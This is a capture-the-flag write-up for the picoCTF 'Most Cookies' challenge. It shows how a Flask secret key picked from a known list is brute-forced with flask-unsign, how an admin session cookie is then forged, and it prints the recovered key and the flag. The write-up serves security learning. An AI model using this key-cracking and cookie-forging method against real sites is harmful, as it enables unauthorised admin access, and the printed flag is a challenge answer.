# Challenge "Most Cookies" Writeup

## Vulnerability: Weak Flask Session Cookie Secret Key

### Where: Flask session management with guessable secret keys

### Impact: This challenge demonstrates how using weak, predictable secret keys for Flask session cookies can lead to privilege escalation by allowing users to forge their own session cookies.

**NOTE**: The challenge involves brute-forcing the Flask secret key, which allows us to modify the session to access admin privileges and retrieve the flag.

## Steps to reproduce:

1. **Analyze the Code**:
   The server uses Flask session cookies and sets the `app.secret_key` by choosing randomly from a list of cookie names:

   ```
   app.secret_key = random.choice(cookie_names)
   ```

   The list of possible secret keys (`cookie_names`) is accessible in the code. Knowing the possible keys allows us to brute-force the actual secret key used to sign the session cookies.

2. **Inspect the Session Cookie**:
   We received a session cookie:

   ```
   eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YGHZvg.hvmOT3C_J1RVk3yrj7zA9Dxo8lA
   ```

   Decoding the base64 payload (`eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9`) revealed:

   ```
   {"very_auth": "blank"}
   ```

   The `very_auth` key is set to `"blank"`, which corresponds to a non-admin user. To retrieve the flag, we need to change `very_auth` to `"admin"`.

3. **Brute-Force the Secret Key**:
   Using `flask-unsign`, we provided the session cookie and a wordlist of `cookie_names` from the code to brute-force the Flask secret key:

   ```
   flask-unsign --unsign --cookie eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YGHZvg.hvmOT3C_J1RVk3yrj7zA9Dxo8lA --wordlist wordlist.txt
   ```

   This returned:

   ```
   [+] Found secret key after 28 attempts: 'wafer'
   ```

4. **Forge an Admin Session Cookie**:
   Now that we have the secret key (`wafer`), we used `flask-unsign` to sign a new session cookie with `{"very_auth": "admin"}`:

   ```
   flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret wafer
   ```

   This generated a new session cookie:

   ```
   eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YGHbOQ.4iogbBnCbe4C3zanPAtBnYj9CUg
   ```

5. **Retrieve the Flag**:
   We set this new session cookie in the browser and visited the `/display` page, which displayed the flag:

   ```
   picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_b4e3f8b1}
   ```

## Conclusion:

By brute-forcing the Flask secret key from a predictable list, we were able to forge a session cookie with admin privileges and retrieve the flag, successfully completing the challenge.
